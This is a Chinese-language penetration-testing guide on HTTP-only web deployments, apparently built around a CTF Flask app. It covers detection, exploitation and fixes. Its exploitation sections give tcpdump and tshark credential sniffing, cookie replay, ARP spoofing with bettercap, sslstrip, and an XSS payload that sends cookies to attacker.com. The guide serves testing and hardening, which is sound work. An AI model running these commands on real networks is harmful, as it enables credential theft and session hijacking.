# HTTP-only 部署攻击

## 1. 技术概述

### 1.1 漏洞原理

HTTP-only 部署是指应用程序仅使用 HTTP 协议部署，未启用 HTTPS/TLS 加密传输。这导致所有网络流量（包括凭证、会话 Cookie、敏感数据）都以明文形式传输，可被同一网络中的攻击者窃听、篡改或劫持。

**本质**：缺乏传输层加密保护，违背了"数据在传输过程中应加密"的安全原则。

### 1.2 适用范围

- 仅使用 HTTP 部署的 Web 应用
- 显式禁用 TLS/SSL 的应用（如 `ENV OPENSSL_CONF=/dev/null`）
- 开发/测试环境暴露到公网
- 内部网络应用错误假设网络环境安全
- CTF 挑战、培训环境等故意脆弱的应用

### 1.3 读者对象

- 执行渗透测试任务的安全工程师
- 进行网络流量分析的安全分析师
- 负责应用部署的运维人员

---

## 2. 攻击场景

### 2.1 常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| Flask 开发服务器 | `app.run(debug=True)` | 默认 HTTP，无 TLS 配置 |
| Docker 容器应用 | 未配置 HTTPS 的容器 | 容器间通信明文传输 |
| 内部管理系统 | 内网 HTTP 服务 | 假设内网安全但实际可访问 |
| API 服务 | 未加密的 REST API | API 调用明文传输 |
| CTF 挑战平台 | 故意脆弱的训练环境 | 教学目的但存在真实风险 |

### 2.2 危险代码模式

**Flask 显式禁用 TLS：**
```python
# 危险代码：仅 HTTP 部署
app.run(debug=True, host='0.0.0.0', port=34545)

# 缺失 HTTPS 配置：
# import ssl
# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
# context.load_cert_chain('cert.pem', 'key.pem')
# app.run(ssl_context=context)
```

**Dockerfile 禁用 OpenSSL：**
```dockerfile
# 危险代码：显式禁用 TLS
ENV OPENSSL_CONF=/dev/null

# 后果：
# - 无法建立 HTTPS 连接
# - 所有流量明文传输
# - 易受中间人攻击
```

**缺失安全 Headers：**
```python
# 缺失的代码：
@app.after_request
def set_security_headers(response):
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 HTTPS 可用性检测

```bash
# 测试 HTTPS 是否可用
curl -kI https://target:34545/
# 如果连接失败，说明仅 HTTP

# 测试 HTTP 到 HTTPS 重定向
curl -I http://target:34545/
# 检查是否有 301/302 重定向到 https://

# 使用 nmap 检测 HTTPS 端口
nmap -p 443 target
# 如果 443 关闭，说明无 HTTPS
```

#### 3.1.2 网络流量窃听

```bash
# 使用 tcpdump 捕获 HTTP 流量
sudo tcpdump -i eth0 -A 'tcp port 34545'

# 使用 Wireshark 图形化分析
wireshark &
# 过滤器：http && tcp.port == 34545

# 观察输出：
# GET /page?name=payload HTTP/1.1
# Host: target:34545
# ...
# 所有内容明文可见
```

#### 3.1.3 安全 Headers 检测

```bash
# 检查响应 Headers
curl -I http://target:34545/

# 检查缺失的安全 Headers：
# ❌ Strict-Transport-Security (HSTS)
# ❌ Content-Security-Policy
# ❌ X-Frame-Options
# ❌ X-Content-Type-Options
```

### 3.2 白盒测试

#### 3.2.1 代码审计关键词

搜索以下 TLS 相关模式（确认缺失）：

**Python Flask:**
- `ssl` 导入（缺失）
- `ssl_context` 配置（缺失）
- `load_cert_chain` 调用（缺失）
- `PROTOCOL_TLS` 使用（缺失）

**Dockerfile:**
- `ENV OPENSSL_CONF=/dev/null`（危险配置）
- 缺失 `EXPOSE 443`
- 缺失证书文件复制

#### 3.2.2 配置文件检查

```python
# 检查 Flask 配置
# 缺失：
# app.config['SESSION_COOKIE_SECURE'] = True  # Cookie 仅 HTTPS
# PREFERRED_URL_SCHEME = 'https'
```

```dockerfile
# 检查 Dockerfile
# 缺失：
# COPY cert.pem /app/cert.pem
# COPY key.pem /app/key.pem
# EXPOSE 443
```

---

## 4. 漏洞利用方法

### 4.1 基础利用技术

#### 4.1.1 被动流量窃听

```bash
# 攻击者在同一网络（如相同 WiFi）
# 启动流量捕获

# 方法 1：tcpdump
sudo tcpdump -i wlan0 -A 'port 34545' > captured_traffic.txt

# 方法 2：Wireshark 命令行版 tshark
tshark -i wlan0 -f 'port 34545' -w captured.pcap

# 等待受害者访问应用
# 所有请求/响应明文记录
```

#### 4.1.2 凭证窃取

```bash
# 如果应用有登录功能
# 过滤登录请求

tshark -i wlan0 -f 'port 34545' \
  -Y 'http.request.method == "POST"' \
  -T fields -e http.file_data

# 输出示例：
# username=admin&password=SuperSecret123!
```

#### 4.1.3 会话劫持

```bash
# 捕获会话 Cookie
tshark -i wlan0 -f 'port 34545' \
  -Y 'http.response.code == 200' \
  -T fields -e http.cookie

# 使用窃取的 Cookie
curl -H "Cookie: session=stolen_session_value" \
  http://target:34545/protected
```

### 4.2 高级利用技术

#### 4.2.1 主动中间人攻击

```bash
# ARP 欺骗（需要内网访问）
# 使用 arpspoof 进行 ARP  poisoning

# 攻击者机器
arpspoof -i eth0 -t victim target
arpspoof -i eth0 -t target victim

# 启用 IP 转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# 使用 BetterCAP 进行 MITM
bettercap -iface eth0
> set arp.spoof.targets target
> arp.spoof on
> http.proxy on
```

#### 4.2.2 请求/响应篡改

```bash
# 使用 BetterCAP 的 http.proxy 模块
bettercap -iface eth0

> set http.proxy.script inject.js
> http.proxy on

# inject.js 内容：
function OnRequest(req, res) {
  // 修改请求
  if (req.Path == "/login") {
    log("Login attempt: " + req.Body);
  }
  
  // 修改响应
  if (res.Path == "/page") {
    res.Body = res.Body.replace("</body>", 
      "<script>alert('XSS')</script></body>");
  }
}
```

#### 4.2.3 SSL Stripping 攻击

```bash
# 如果目标同时有 HTTP 和 HTTPS
# 使用 sslstrip 降级攻击

sslstrip -l 8080 -w output.txt

# 配置受害者流量经过攻击者
# 所有 HTTPS 请求被降级为 HTTP
# 流量明文可被读取
```

### 4.3 结合其他漏洞

#### 4.3.1 结合 XSS 进行会话窃取

```javascript
// XSS Payload 通过 HTTP 注入
// 由于无 HTTPS，Cookie 可被窃听

"><script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script><input "

// 如果 Cookie 有 Secure 标志，此攻击失败
// 但 HTTP-only 部署通常也无 Secure 标志
```

#### 4.3.2 结合 CSRF

```html
<!-- 由于无 CSRF 保护且 HTTP 明文 -->
<!-- 攻击者可构造 CSRF 请求 -->

<img src="http://target:34545/admin/delete?id=1" 
     style="display:none">

<!-- 受害者浏览器自动发送请求 -->
<!-- Cookie 明文传输，可被窃听 -->
```

---

## 5. 实战案例

### 5.1 CTF 挑战流量分析

**目标环境：**
- Flask 应用运行在 `http://localhost:34545`
- 无 HTTPS 配置
- `ENV OPENSSL_CONF=/dev/null`

**利用步骤：**

1. **确认 HTTP-only 部署：**
```bash
curl -I http://localhost:34545/
# HTTP/1.0 200 OK
# 无 HTTPS 重定向

curl -kI https://localhost:34545/
# 连接失败
```

2. **检查 Docker 配置：**
```bash
cat Dockerfile | grep -i ssl
# 输出：ENV OPENSSL_CONF=/dev/null
```

3. **流量捕获（模拟攻击）：**
```bash
# 在另一终端启动应用
# 在本终端捕获流量

tcpdump -i lo -A 'port 34545'

# 访问应用
curl 'http://localhost:34545/page?name=test'

# 观察 tcpdump 输出：
# GET /page?name=test HTTP/1.1
# 所有内容明文可见
```

### 5.2 生产环境凭证泄露

**场景：** 内部管理系统仅 HTTP 部署

**利用：**

```bash
# 1. 连接到公司 WiFi

# 2. 启动流量捕获
sudo tcpdump -i wlan0 -A 'port 80' -w internal_traffic.pcap

# 3. 等待用户登录管理系统

# 4. 分析捕获的流量
tshark -r internal_traffic.pcap \
  -Y 'http.request.method == "POST"' \
  -T fields -e http.file_data

# 输出：
# username=admin&password=CompanySecret123
```

---

## 6. 检测清单

### 6.1 自动化检测

- [ ] 使用 SSL Labs 测试 HTTPS 配置
- [ ] 使用 Nuclei 检测 HTTP-only 部署
- [ ] 使用 Burp Suite 检测安全 Headers
- [ ] 使用 testssl.sh 进行 SSL/TLS 测试

### 6.2 手工检测

- [ ] 测试 HTTPS 是否可用
- [ ] 检查 HTTP 到 HTTPS 重定向
- [ ] 检查 HSTS Header
- [ ] 检查 Cookie Secure 标志
- [ ] 使用 tcpdump 验证流量加密

---

## 7. 修复建议

### 7.1 启用 HTTPS

**Flask 配置 HTTPS：**
```python
from flask import Flask
import ssl

app = Flask(__name__)

# 创建 SSL 上下文
context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
context.load_cert_chain('cert.pem', 'key.pem')

# 使用 HTTPS 运行
app.run(ssl_context=context, host='0.0.0.0', port=443)
```

**使用 Let's Encrypt 获取证书：**
```bash
# 安装 certbot
sudo apt-get install certbot python3-certbot-nginx

# 获取证书
sudo certbot --nginx -d example.com

# 自动续期
sudo certbot renew --dry-run
```

### 7.2 添加安全 Headers

```python
@app.after_request
def set_security_headers(response):
    # HSTS - 强制 HTTPS
    response.headers['Strict-Transport-Security'] = \
        'max-age=31536000; includeSubDomains'
    
    # CSP - 内容安全策略
    response.headers['Content-Security-Policy'] = \
        "default-src 'self'"
    
    # 防止点击劫持
    response.headers['X-Frame-Options'] = 'DENY'
    
    # 防止 MIME 嗅探
    response.headers['X-Content-Type-Options'] = 'nosniff'
    
    return response
```

### 7.3 Cookie 安全配置

```python
app.config['SESSION_COOKIE_SECURE'] = True  # 仅 HTTPS
app.config['SESSION_COOKIE_HTTPONLY'] = True  # 禁止 JS 访问
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # CSRF 保护
```

### 7.4 Docker 配置

```dockerfile
# 移除危险的 OpenSSL 禁用
# ENV OPENSSL_CONF=/dev/null  # 删除此行

# 复制证书
COPY cert.pem /app/cert.pem
COPY key.pem /app/key.pem

# 暴露 HTTPS 端口
EXPOSE 443
```

---

## 8. 参考资源

- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [OWASP Top 10:2025 A04 Cryptographic Failures](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/)
- [SSL Labs - SSL Server Test](https://www.ssllabs.com/ssltest/)
- [Let's Encrypt](https://letsencrypt.org/)
